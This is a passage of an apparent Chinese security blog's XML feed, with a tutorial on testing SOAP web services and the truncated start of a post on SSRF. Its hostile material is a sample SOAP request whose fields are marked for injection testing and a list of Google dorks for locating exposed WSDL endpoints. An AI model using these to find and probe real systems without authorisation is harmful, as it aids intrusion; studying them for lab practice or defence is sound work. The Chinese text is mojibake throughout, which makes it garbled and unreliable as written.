      <link href="/2022/10/16/Web%20Service%20%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%20SOAP/"/>
      <url>/2022/10/16/Web%20Service%20%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%20SOAP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€Web-Service-æ¦‚è¿°"><a href="#ä¸€ã€Web-Service-æ¦‚è¿°" class="headerlink" title="ä¸€ã€Web Service æ¦‚è¿°"></a>ä¸€ã€Web Service æ¦‚è¿°</h2><p>WebService æ˜¯ä¸€ç§è·¨å¹³å°ï¼Œè·¨è¯­è¨€çš„è§„èŒƒï¼Œç”¨äºä¸åŒå¹³å°ï¼Œä¸åŒè¯­è¨€å¼€å‘çš„åº”ç”¨ä¹‹é—´çš„äº¤äº’ã€‚å³ JAVA åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ websrvice è°ƒç”¨ PHP æˆ–è€… Python ç­‰ç¨‹åºæä¾›çš„æœåŠ¡ã€‚WebService ä¸‰è¦ç´ ï¼šSOAPã€WSDLã€UDDIã€‚</p><h3 id="WebService-ä¸‰è¦ç´ ï¼š"><a href="#WebService-ä¸‰è¦ç´ ï¼š" class="headerlink" title="WebService ä¸‰è¦ç´ ï¼š"></a><strong>WebService ä¸‰è¦ç´ ï¼š</strong></h3><p><code>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰ </code>æ˜¯åŸºäº XML çš„ç®€æ˜“åè®®ï¼Œå¯ä½¿åº”ç”¨ç¨‹åºåœ¨ HTTP ä¹‹ä¸Šè¿›è¡Œä¿¡æ¯äº¤æ¢ï¼Œæ˜¯è¿æ¥æˆ– Web æœåŠ¡æˆ–å®¢æˆ·ç«¯å’Œ Web æœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚ç®€å•åœ°è¯´å°±æ˜¯ï¼ŒSOAP æ˜¯ç”¨äºè®¿é—®ç½‘ç»œæœåŠ¡çš„åè®®ã€‚</p><p><code>WSDL</code>ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚å‘Šè¯‰è°ƒç”¨è€…åº”è¯¥æ€ä¹ˆå¡«å†™SOAPå½“ä¸­çš„XMLæ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚æœåŠ¡ç«¯å…·ä½“æä¾›äº†ä»€ä¹ˆæœåŠ¡ï¼Œè¯¥æ€ä¹ˆè°ƒç”¨è¿™ä¸ªæœåŠ¡ï¼Œè¯¥ä¼ é€’ä»€ä¹ˆç±»å‹çš„å‚æ•°ã€‚ä¼šè¿”å›ä»€ä¹ˆç±»å‹çš„æ•°æ®ç­‰ç­‰ã€‚</p><p><code>UDDI</code> ç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢ WebServiceã€‚</p><h2 id="äºŒã€SOAP-ç®€è¿°"><a href="#äºŒã€SOAP-ç®€è¿°" class="headerlink" title="äºŒã€SOAP ç®€è¿°"></a>äºŒã€SOAP ç®€è¿°</h2><p>SOAP æ¶ˆæ¯ç»„æˆéƒ¨åˆ†ï¼šæ‰€æœ‰çš„ SOAP æ¶ˆæ¯éƒ½ä½¿ç”¨ XML ç¼–ç ï¼Œä¸€æ¡ SOAP æ¶ˆæ¯å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ XML æ–‡æ¡£ï¼Œè¯¥æ–‡æ¡£åŒ…æ‹¬ä¸‹åˆ—å…ƒç´ ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Envelopeï¼ˆä¿¡å°ï¼‰å…ƒç´ ï¼Œå¿…é€‰ï¼Œå¯æŠŠæ­¤ XML æ–‡æ¡£æ ‡è¯†ä¸ºä¸€æ¡ SOAP æ¶ˆæ¯ã€‚</span><br><span class="line">Headerï¼ˆæŠ¥å¤´ï¼‰å…ƒç´ ï¼Œå¯é€‰ï¼ŒåŒ…å«å¤´éƒ¨ä¿¡æ¯ï¼ˆåŒ…å«äº†ä½¿æ¶ˆæ¯åœ¨åˆ°è¾¾æœ€ç»ˆç›®çš„åœ°ä¹‹å‰ï¼Œèƒ½å¤Ÿè¢«è·¯ç”±åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªä¸­é—´èŠ‚ç‚¹çš„ä¿¡æ¯ï¼‰ã€‚</span><br><span class="line">Body(ä¸»ä½“)å…ƒç´ ï¼Œå¿…é€‰ï¼ŒåŒ…å«æ‰€æœ‰çš„è°ƒç”¨å’Œå“åº”ä¿¡æ¯ã€‚</span><br><span class="line">Fault å…ƒç´ ï¼Œä½äº Body å†…ï¼Œå¯é€‰ï¼Œæä¾›æœ‰å…³å¤„ç†æ­¤æ¶ˆæ¯æ‰€å‘ç”Ÿé”™è¯¯çš„ä¿¡æ¯ã€‚</span><br><span class="line">Attachmentï¼ˆé™„ä»¶ï¼‰å…ƒç´ ï¼Œå¯é€‰ï¼Œå¯é€šè¿‡æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªé™„ä»¶æ‰©å±• SOAP æ¶ˆæ¯ã€‚</span><br></pre></td></tr></table></figure></div><p>SOAP æ¶ˆæ¯æ ¼å¼ä¾‹å­</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:soap</span>=<span class="string">&quot;http://www.w3.org/2001/12/soap-envelope&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">soap:encodingStyle</span>=<span class="string">&quot;http://www.w3.org/2001/12/soap-encoding&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="ä¸‰ã€SOAP-æ¥å£æ¼æ´"><a href="#ä¸‰ã€SOAP-æ¥å£æ¼æ´" class="headerlink" title="ä¸‰ã€SOAP æ¥å£æ¼æ´"></a>ä¸‰ã€SOAP æ¥å£æ¼æ´</h2><p>SOAP å‹ Web Service æ¼æ´ç±»å‹ä¸ Web æ¼æ´ç±»å‹åŒºåˆ«ä¸å¤ªï¼Œåªæ˜¯è¯·æ±‚çš„ payload æ„é€ éœ€è¦æ»¡è¶³ä¸€äº›æ ¼å¼è¦æ±‚ï¼Œå…·ä½“è¦çœ‹Web ServiceæœåŠ¡ç«¯ä»£ç ç¼–å†™æƒ…å†µã€‚æ¼æ´ç±»å‹æ¯”å¦‚å‘½ä»¤æ³¨å…¥ã€SQLæ³¨å…¥ã€XSSã€XXEã€XPathæ³¨å…¥ã€DoSã€é€»è¾‘æ¼æ´ã€ä¿¡æ¯æ³„éœ²â€¦â€¦ç­‰ç­‰ã€‚</p><p>å¦‚ä¸‹ä¸ºä¸€ä¸ªå‘˜å·¥èµ„æ–™æŸ¥è¯¢åŠŸèƒ½ï¼Œå…¶ä¸­<code>&lt;wkno&gt;string&lt;/wkno&gt;</code> <code>&lt;dept&gt;string&lt;/dept&gt;</code> <code>&lt;memo&gt;string&lt;/memo&gt;</code>  <code>&lt;status&gt;string&lt;/status&gt;</code> <code>&lt;sex&gt;string&lt;/sex&gt;</code> <code>&lt;agefilter&gt;string&lt;/agefilter&gt;</code> <code>&lt;name&gt;string&lt;/name&gt;</code> <code>&lt;token&gt;string&lt;/token&gt;</code> ä¸ºç”¨æˆ·è¾“å…¥çš„æ•°æ®,å¯ä½œä¸ºæµ‹è¯•ç‚¹è¿›è¡Œæ¼æ´æµ‹è¯•ã€‚</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /Service1.asmx HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Content-Length: length</span><br><span class="line">SOAPAction: &quot;http://x.x.x.x&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr_ygzlcx</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://x.x.x.x&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">wkno</span>&gt;</span>string<span class="tag">&lt;/<span class="name">wkno</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dept</span>&gt;</span>string<span class="tag">&lt;/<span class="name">dept</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">memo</span>&gt;</span>string<span class="tag">&lt;/<span class="name">memo</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">status</span>&gt;</span>string<span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">sex</span>&gt;</span>string<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">agefilter</span>&gt;</span>string<span class="tag">&lt;/<span class="name">agefilter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>string<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">token</span>&gt;</span>string<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hr_ygzlcx</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>ä¾‹å¦‚åœ¨ç½‘é¡µä¸Šå‘ç°å­˜åœ¨ SOAP æ¥å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¾“å…¥ç‚¹è¿›è¡Œæµ‹è¯•ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016151628400.png" data-caption="image-20221016151628400"><img src="/../images/soap/image-20221016151628400.png" alt="image-20221016151628400"></a></p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016164820032.png" data-caption="image-20221016164820032"><img src="/../images/soap/image-20221016164820032.png" alt="image-20221016164820032"></a></p><p>æµ‹è¯•çš„æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ° xxx?WSDL é¡µé¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ Burp æ’ä»¶ Wsdler æå–æ¥å£è¿›è¡Œæµ‹è¯•ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016154746376.png" data-caption="image-20221016154746376"><img src="/../images/soap/image-20221016154746376.png" alt="image-20221016154746376"></a></p><p>burp å•†åº—å®‰è£… Wsdler æ’ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016152601142.png" data-caption="image-20221016152601142"><img src="/../images/soap/image-20221016152601142.png" alt="image-20221016152601142"></a></p><p>æ‰¾åˆ° asmx?WSDL é¡µé¢ï¼ŒæŠ“å–æ•°æ®åŒ…ç›´æ¥å³é”® Extensions å¤„æå–æ¥å£</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016155316639.png" data-caption="image-20221016155316639"><img src="/../images/soap/image-20221016155316639.png" alt="image-20221016155316639"></a></p><p>æˆåŠŸæå–æ•°æ®æ¥å£ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œæ¼æ´æµ‹è¯•</p><p><a data-fancybox="gallery" data-src="/../images/soap/image-20221016155642151.png" data-caption="image-20221016155642151"><img src="/../images/soap/image-20221016155642151.png" alt="image-20221016155642151"></a></p><h2 id="å››ã€æœç´¢-Web-Service-æœåŠ¡"><a href="#å››ã€æœç´¢-Web-Service-æœåŠ¡" class="headerlink" title="å››ã€æœç´¢ Web Service æœåŠ¡"></a>å››ã€æœç´¢ Web Service æœåŠ¡</h2><p>Google æŒ‡å®šæœç´¢ Web Service æœåŠ¡,å¦‚ä¸‹æ‰€ç¤ºï¼ŒæŒ‡å®šç«™ç‚¹æ—¶å¯åœ¨å‰é¢æ·»åŠ  site:x.x.x.x</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">filetype:asmx inurl:(_vti_bin | api | webservice | ws )</span><br><span class="line">inurl:dll?wsdl filetype:dll</span><br><span class="line">inurl:jws?wsdl</span><br><span class="line">inurl:asmx?wsdl</span><br><span class="line">inurl:aspx?wsdl</span><br><span class="line">inurl:ascx?wsdl</span><br><span class="line">inurl:ashx?wsdl</span><br><span class="line">inurl:dll?wsdl</span><br><span class="line">inurl:exe?wsdl</span><br><span class="line">inurl:php?wsdl</span><br><span class="line">inurl:pl?wsdl</span><br><span class="line">inurl:?wsdl</span><br><span class="line">filetype:jws</span><br><span class="line">filetype:asmx</span><br><span class="line">filetype:ascx</span><br><span class="line">filetype:aspx</span><br><span class="line">filetype:ashx</span><br><span class="line">filetype:dll</span><br><span class="line">filetype:exe</span><br><span class="line">filetype:php</span><br><span class="line">filetype:pl</span><br><span class="line">filetype:wsdl</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€å°ç»“"><a href="#äº”ã€å°ç»“" class="headerlink" title="äº”ã€å°ç»“"></a>äº”ã€å°ç»“</h2><p>é€šè¿‡äº†è§£å­¦ä¹ åå‘ç°ï¼Œsoap æ¥å£æµ‹è¯•ä¸å¸¸è§„çš„æµ‹è¯•åŒºåˆ«ä¸å¤§ï¼Œä¸»è¦åŒºåˆ«å°±æ˜¯è°ƒç”¨çš„æ¥å£ä½¿ç”¨ XML æ ¼å¼ï¼Œæµ‹è¯•æ—¶éœ€è¦æ„é€ ç›¸å…³è¡¨å•è¿›è¡Œæµ‹è¯•ã€‚</p><h2 id="å…­ã€å‚è€ƒæ–‡ç« "><a href="#å…­ã€å‚è€ƒæ–‡ç« " class="headerlink" title="å…­ã€å‚è€ƒæ–‡ç« "></a>å…­ã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/85410</span><br><span class="line">https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</span><br><span class="line">http://emonsec.com/web/51995.html</span><br><span class="line">https://cloud.tencent.com/developer/article/1640199</span><br><span class="line">https://www.cnblogs.com/UniqueColor/p/5788906.html</span><br><span class="line">https://mp.weixin.qq.com/s/UTClGLSvQ3rdUoGeRlvp4w</span><br><span class="line">https://blog.csdn.net/weixin_50464560/article/details/125022377</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEBæ¼æ´ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å­¦ä¹  </tag>
            
            <tag> SOAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBæ¼æ´ç³»åˆ—-SSRF(æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</title>
      <link href="/2022/10/07/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF/"/>
      <url>/2022/10/07/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€æ¼æ´åŸç†"><a href="#ä¸€ã€æ¼æ´åŸç†" class="headerlink" title="ä¸€ã€æ¼æ´åŸç†"></a>ä¸€ã€æ¼æ´åŸç†</h2><p>SSRFï¼ˆServer-Side Request Forgery æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ç”±æ”»å‡»è€…ä¼ªé€ ä»æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚<code>å³æ”»å‡»è€…ä¼ªé€ æœåŠ¡ç«¯çš„è¯·æ±‚å‘èµ·æ”»å‡»ï¼Œé€šè¿‡æœåŠ¡ç«¯ä½œä¸ºè·³æ¿æ”»å‡»ç›®æ ‡ç³»ç»Ÿ</code>ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚å› ä¸º SSRF çš„å­˜åœ¨ï¼Œè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œæ‰€ä»¥èƒ½å¤Ÿè¯·æ±‚ä¸å®ƒç›¸è¿å¹¶ä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿã€‚<code>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</code>ã€‚æ¯”å¦‚ä»æŒ‡å®š URL åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ã€‚</p><h2 id="äºŒã€æ¼æ´å±å®³"><a href="#äºŒã€æ¼æ´å±å®³" class="headerlink" title="äºŒã€æ¼æ´å±å®³"></a>äºŒã€æ¼æ´å±å®³</h2><p>SSRF å¯ä»¥è¿›è¡Œå†…å¤–ç½‘çš„ç«¯å£å’ŒæœåŠ¡æ¢æµ‹ã€ä¸»æœºæœ¬åœ°æ•æ„Ÿæ•°æ®çš„è¯»å–ã€å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„æ¢æµ‹å’Œåˆ©ç”¨ç­‰ã€‚å…¶ä¸­ SSRF åˆ†ä¸º<code>å›æ˜¾å‹ SSRF</code> å’Œ<code>éå›æ˜¾å‹ SSRF</code>ï¼Œæ‰€è°“çš„å›æ˜¾å‹çš„ SSRF å°±æ˜¯ä¼šå°†è®¿é—®åˆ°çš„ä¿¡æ¯è¿”å›ç»™æ”»å‡»è€…ï¼Œè€Œéå›æ˜¾çš„ SSRF åˆ™ä¸ä¼šï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡dns logæˆ–è€…è®¿é—®å¼€æ”¾&#x2F;æœªå¼€æ”¾çš„ç«¯å£å¯¼è‡´çš„å»¶æ—¶æ¥åˆ¤æ–­ã€‚</p><h2 id="ä¸‰ã€æ¼æ´ä½ç½®"><a href="#ä¸‰ã€æ¼æ´ä½ç½®" class="headerlink" title="ä¸‰ã€æ¼æ´ä½ç½®"></a>ä¸‰ã€æ¼æ´ä½ç½®</h2><p>èƒ½å¯¹å¤–ç½‘å‘èµ·è®¿é—®çš„åŠŸèƒ½ç‚¹éƒ½æœ‰å¯èƒ½å­˜åœ¨ SSRFã€‚ä¾‹å¦‚ï¼š(æ‘˜æŠ„)</p><table><thead><tr><th>åŠŸèƒ½ç‚¹</th><th>å…·ä½“æè¿°</th></tr></thead><tbody><tr><td>1ã€ç¤¾äº¤åˆ†äº«åŠŸèƒ½</td><td>è·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</td></tr><tr><td>2ã€è½¬ç æœåŠ¡</td><td>é€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</td></tr><tr><td>3ã€åœ¨çº¿ç¿»è¯‘</td><td>ç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</td></tr><tr><td>4ã€å›¾ç‰‡åŠ è½½&#x2F;ä¸‹è½½</td><td>ä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</td></tr><tr><td>5ã€å›¾ç‰‡&#x2F;æ–‡ç« æ”¶è—åŠŸèƒ½</td><td>ä¸»è¦ç½‘ç«™ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨æˆ·ä½“éªŒ</td></tr><tr><td>6ã€äº‘æœåŠ¡å‚å•†</td><td>å®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡ŒSSRFæµ‹è¯•</td></tr><tr><td>7ã€ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹</td><td>ä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</td></tr><tr><td>8ã€æ•°æ®åº“å†…ç½®åŠŸèƒ½</td><td>æ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</td></tr><tr><td>9ã€é‚®ä»¶ç³»ç»Ÿ</td><td>æ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</td></tr><tr><td>10ã€ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†</td><td>æ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</td></tr><tr><td>11ã€æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½</td><td>å¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ï¼Œä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</td></tr><tr><td>12ã€ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æº</td><td>upload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.php</td></tr></tbody></table><h2 id="å››ã€æ¼æ´ç¯å¢ƒæ­å»º"><a href="#å››ã€æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="å››ã€æ¼æ´ç¯å¢ƒæ­å»º"></a>å››ã€æ¼æ´ç¯å¢ƒæ­å»º</h2><p>SSRF é¡¹ç›®æºç æ¥è‡ªäº <code>https://github.com/sqlsec/ssrf-vuls</code>ï¼Œæœ¬æ¬¡æ­å»ºç¯å¢ƒä¸º <code>Windows10ã€windwos7 + Phpstudy</code>ã€‚</p><p>åˆ©ç”¨ windows 10ä¸ windwos 7 æ­å»ºåŒç½‘æ®µç½‘ç«™ã€‚windows 10 æ­å»ºå­˜åœ¨ SSRF æ¼æ´çš„ç«™ç‚¹ï¼Œwindwos 7 æ­å»ºåŒç½‘æ®µä¸­å­˜åœ¨æ¼æ´çš„ç«™ç‚¹ï¼Œåˆ©ç”¨ SSRF æ¼æ´è¿›è¡ŒåŒç½‘æ®µæ¼æ´æ¢æµ‹</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007163514324.png" data-caption="image-20221007163514324"><img src="/../images/ssrf/image-20221007163514324.png" alt="image-20221007163514324"></a></p><p>windwos 10 æ–°å»º SSRF é¶åœºï¼Œå³é¡¹ç›®æºç  <code>172.72.23.21-SSRF</code>ï¼Œè®¾ç½®ä¸º 8002ç«¯å£</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171837778.png" data-caption="image-20221007171837778"><img src="/../images/ssrf/image-20221007171837778.png" alt="image-20221007171837778"></a></p><p>æ­å»ºå®Œæ¯•åç•Œé¢ï¼Œä¸»è¦å°±æ˜¯è¯·è¾“å…¥æŸ¥è¯¢çš„ç½‘ç«™è¿™ä¸ªè¾“å…¥æ¡†ï¼Œä¸º SSRF æ¼æ´ç‚¹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007165405852.png" data-caption="image-20221007165405852"><img src="/../images/ssrf/image-20221007165405852.png" alt="image-20221007165405852"></a></p><p>windows 7 æ­å»ºä»£ç æ³¨å…¥é¶åœºï¼Œå¯¹åº”é¡¹ç›®æºç  <code>172.72.23.22-CodeExec</code></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171909704.png" data-caption="image-20221007171909704"><img src="/../images/ssrf/image-20221007171909704.png" alt="image-20221007171909704"></a></p><p>æ­å»ºå®Œæ¯•åç•Œé¢ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007165325659.png" data-caption="image-20221007165325659"><img src="/../images/ssrf/image-20221007165325659.png" alt="image-20221007165325659"></a></p><p>æ­å»º XXE æ¼æ´é¶åœº,å¯¹åº”é¡¹ç›®æºç  <code>172.72.23.25-XXE</code></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171941968.png" data-caption="image-20221007171941968"><img src="/../images/ssrf/image-20221007171941968.png" alt="image-20221007171941968"></a></p><p>æ­å»ºå®Œæ¯•åç•Œé¢ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007172006303.png" data-caption="image-20221007172006303"><img src="/../images/ssrf/image-20221007172006303.png" 